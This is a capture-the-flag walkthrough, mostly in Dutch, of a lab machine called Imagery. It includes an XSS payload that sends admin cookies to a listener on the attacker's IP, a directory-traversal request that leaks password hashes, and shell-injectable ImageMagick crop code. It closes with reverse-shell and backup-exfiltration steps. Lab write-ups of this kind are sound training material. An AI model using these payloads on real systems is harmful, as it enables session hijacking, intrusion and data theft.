# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.246.234       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 18:55 CEST
Nmap scan report for 10.129.246.234
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~]
└─$ nmap -p22,8000 -sCV 10.129.246.234
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 18:56 CEST
Nmap scan report for 10.129.246.234
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben naar de webpagina gegaan, en daar heb ik gezien dat ik mij een user kon registeren. Eens dat ik ben ingeloged met de user die ik geregistreerd zijn, kan je bestanden gaan uploaden. 

![[Pasted image 20250930190028.png]]

De upload zullen we later waarschijnlijk gaan gebruiken voor het uploaden van een RCE. Nu kan je gaan zien als je bent ingeloged dat er een Report Bug button te voorschijn komt eens als je bent ingeloged.

![[Pasted image 20250930193936.png]]

Wat als we nu een bug zullen gaan aangeven, kan je doorgebruik te maken van burpsuite. Hiermee zal je een admin cookie krijgen. admin panel hebben voor te connecten en rce doen.

```
Request
POST /report_bug HTTP/1.1

Host: imagery.htb:8000
Cookie: session=.eJyrVkrJLC7ISaz0TFGyUrIwSTIwSrUwV9JRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCL6MkSakWAHHYLl8.aTnHGQ.-aT76Rl4rR17FHfYbH0MSJ70aFQ
Connection: keep-alive

{"bugName":"test","bugDetails":"<img src=x onerror=\"location.href='http://10.10.16.154:4444/?c='+ document.cookie\">"}


Listener
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.242.164 - - [10/Dec/2025 21:30:15] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aTnRDA.lWiFl5bQcEDI1hA_ZKRk40mBxdg HTTP/1.1" 200 -
```

![[Pasted image 20251210210136.png]]

Maar dit werkte niet. Ik ben eens de log gaan proberen downloaden van de testuser en je zult kunnen zien dat we een error krijgen. Maar in de URL staat er wel belangrijke informatie ("http://imagery.htb:8000/admin/get_system_log?log_identifier=testuser%40imagery.htb.log"). Door gebruik te maken van sites zoals portswigger ben ik erop gekomen een LFI path te proberen. Wat als ik nu in burpsuite het einde van de url verwijder en hier een LFI doe op /etc/passwd. We gaan in de urlbalk de volgende url gaan zoeken http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json. Als we op burpsuite gaan kijken dan kan je zien dat we daar een admin username en password hebben.

```
Request
GET /admin/get_system_log?log_identifier=../db.json HTTP/1.1
Host: 10.129.242.164:8000
Content-Length: 0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.129.242.164:8000
Referer: http://10.129.242.164:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPfdJg.d67ZYlAMKQ7_XErJGjYP4uQCqzM
Priority= u=4

Response

{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
```

Ik ben de hashes gaan cracken door gebruik te maken van CrackStation.

```
|Hash|Type|Result|
|---|---|---|
testuser@imagary.htb = 2c65c8d7bfbca32a3ed42596192384f6, md5 = iambatman
```

Ik zal met deze credentials gaan inloggen als testuser.

![[Pasted image 20251001203454.png]]

Binnen de api_edit.py zal je kunnen zien dat er het volgende staat. Dit betekend dat het kwetsbaar is waarmee we dit zullen moeten gebruiken voor een RCE commando.
```
if transform_type == 'crop':
    command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
    subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```
Admin log endpoint has LFI (directory traversal) — retrieve db.json and other app files. 
Analyse api_edit.py (image transform handler) — crop operation uses shell=True and concatenates parameters → command injection possible. 
Use a privileged account (test user) to upload an image and trigger the crop transform with a command injection payload → reverse shell.
On the box: read /var/backup/web_20250806_120723.zip.aes (world-readable) and exfiltrate.
Crack / decrypt the AES-Crypt .aes backup offline with a wordlist (rockyou) using pyAesCrypt wrapper → recover archive → inspect db.json to find other credentials/hashes.
Use an obtained user credential to SSH/switch to the user account and read user.txt.